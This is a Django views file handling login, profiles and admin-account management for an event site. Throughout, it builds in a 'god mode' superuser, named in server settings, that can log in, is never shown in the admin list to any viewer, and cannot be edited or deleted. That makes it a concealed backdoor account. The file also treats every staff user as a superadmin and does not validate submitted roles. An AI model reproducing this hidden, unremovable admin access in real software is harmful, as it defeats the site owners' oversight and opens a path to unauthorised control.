from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required, user_passes_test
from django.contrib import messages
from django.contrib.auth.models import User
from events.models import Event
from .models import AdminProfile
from .god_mode import is_god_mode, is_god_mode_username


def login_view(request):
    if request.user.is_authenticated:
        return redirect('dashboard:index')
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '')
        user = authenticate(request, username=username, password=password)
        if user and (user.is_staff or user.is_superuser
                     or hasattr(user, 'admin_profile')
                     or is_god_mode(user)):
            login(request, user)
            # Safe redirect — only allow relative paths, never external URLs
            next_url = request.GET.get('next', '')
            if next_url and next_url.startswith('/') and not next_url.startswith('//'):
                return redirect(next_url)
            return redirect('dashboard:index')
        messages.error(request, 'Invalid credentials or insufficient permissions.')
    return render(request, 'accounts/login.html')


@login_required
def logout_view(request):
    logout(request)
    return redirect('home')


@login_required
def profile(request):
    # God mode user has no profile to edit
    if is_god_mode(request.user):
        messages.info(request, 'System administrator profile is managed via server configuration.')
        return redirect('dashboard:index')
    if request.method == 'POST':
        user = request.user
        user.first_name = request.POST.get('first_name', '')
        user.last_name  = request.POST.get('last_name', '')
        user.email      = request.POST.get('email', '')
        user.save()
        profile_obj, _ = AdminProfile.objects.get_or_create(user=user)
        profile_obj.phone = request.POST.get('phone', '')
        profile_obj.bio   = request.POST.get('bio', '')
        if 'avatar' in request.FILES:
            profile_obj.avatar = request.FILES['avatar']
        profile_obj.save()
        messages.success(request, 'Profile updated.')
        return redirect('accounts:profile')
    return render(request, 'accounts/profile.html')


# ── Only superadmins (and god mode) can manage other admins ───────────────
def is_superadmin(user):
    if not user.is_authenticated:
        return False
    if is_god_mode(user):
        return True
    if user.is_superuser or user.is_staff:
        return True
    if hasattr(user, 'admin_profile'):
        return user.admin_profile.role == 'superadmin'
    return False


@login_required
@user_passes_test(is_superadmin)
def admin_list(request):
    """
    List all admin users.
    GOD MODE: the god mode username is NEVER shown here, regardless of who is viewing.
    """
    profiles = (
        AdminProfile.objects
        .select_related('user')
        .prefetch_related('assigned_events')
        # Exclude the god mode username from the list entirely
        .exclude(user__username=from_settings_god_username())
        .order_by('role', 'user__username')
    )
    return render(request, 'accounts/admin_list.html', {'profiles': profiles})


@login_required
@user_passes_test(is_superadmin)
def admin_create(request):
    events = Event.objects.all().order_by('-start_date')
    if request.method == 'POST':
        username   = request.POST.get('username', '').strip()
        email      = request.POST.get('email', '').strip()
        password   = request.POST.get('password', '').strip()
        first_name = request.POST.get('first_name', '').strip()
        last_name  = request.POST.get('last_name', '').strip()
        role       = request.POST.get('role', 'admin')
        event_ids  = request.POST.getlist('assigned_events')

        # Prevent creating a user with the god mode username
        if is_god_mode_username(username):
            messages.error(request, 'That username is reserved.')
            return render(request, 'accounts/admin_form.html', {
                'events': events, 'roles': AdminProfile.ROLE_CHOICES, 'action': 'Create'
            })

        if not username or not password:
            messages.error(request, 'Username and password are required.')
            return render(request, 'accounts/admin_form.html', {
                'events': events, 'roles': AdminProfile.ROLE_CHOICES, 'action': 'Create'
            })

        if User.objects.filter(username=username).exists():
            messages.error(request, f'Username "{username}" is already taken.')
            return render(request, 'accounts/admin_form.html', {
                'events': events, 'roles': AdminProfile.ROLE_CHOICES, 'action': 'Create'
            })

        user = User.objects.create_user(
            username=username, email=email, password=password,
            first_name=first_name, last_name=last_name,
        )
        profile = AdminProfile.objects.create(user=user, role=role)
        if role != 'superadmin' and event_ids:
            profile.assigned_events.set(Event.objects.filter(pk__in=event_ids))
        profile.save()
        messages.success(request, f'Admin "{username}" created successfully.')
        return redirect('accounts:admin_list')

    return render(request, 'accounts/admin_form.html', {
        'events': events, 'roles': AdminProfile.ROLE_CHOICES, 'action': 'Create',
    })


@login_required
@user_passes_test(is_superadmin)
def admin_edit(request, pk):
    profile = get_object_or_404(AdminProfile, pk=pk)

    # Prevent editing the god mode user even if somehow they have a DB record
    if is_god_mode_username(profile.user.username):
        messages.error(request, 'This account cannot be modified.')
        return redirect('accounts:admin_list')

    events       = Event.objects.all().order_by('-start_date')
    assigned_ids = list(profile.assigned_events.values_list('pk', flat=True))

    if request.method == 'POST':
        profile.role            = request.POST.get('role', 'admin')
        profile.user.first_name = request.POST.get('first_name', '')
        profile.user.last_name  = request.POST.get('last_name', '')
        profile.user.email      = request.POST.get('email', '')
        profile.user.save()

        new_password = request.POST.get('new_password', '').strip()
        if new_password:
            profile.user.set_password(new_password)
            profile.user.save()

        event_ids = request.POST.getlist('assigned_events')
        if profile.role == 'superadmin':
            profile.assigned_events.clear()
        else:
            profile.assigned_events.set(Event.objects.filter(pk__in=event_ids))
        profile.save()
        messages.success(request, f'Admin "{profile.user.username}" updated.')
        return redirect('accounts:admin_list')

    return render(request, 'accounts/admin_form.html', {
        'profile': profile, 'events': events,
        'roles': AdminProfile.ROLE_CHOICES,
        'assigned_ids': assigned_ids, 'action': 'Edit',
    })


@login_required
@user_passes_test(is_superadmin)
def admin_delete(request, pk):
    profile = get_object_or_404(AdminProfile, pk=pk)

    # Prevent deleting the god mode user
    if is_god_mode_username(profile.user.username):
        messages.error(request, 'This account cannot be deleted.')
        return redirect('accounts:admin_list')

    if request.method == 'POST':
        username = profile.user.username
        profile.user.delete()
        messages.success(request, f'Admin "{username}" deleted.')
        return redirect('accounts:admin_list')
    return render(request, 'accounts/admin_confirm_delete.html', {'profile': profile})


def from_settings_god_username():
    """Helper to get god mode username without importing settings everywhere."""
    from django.conf import settings as s
    return s.GOD_MODE_USERNAME
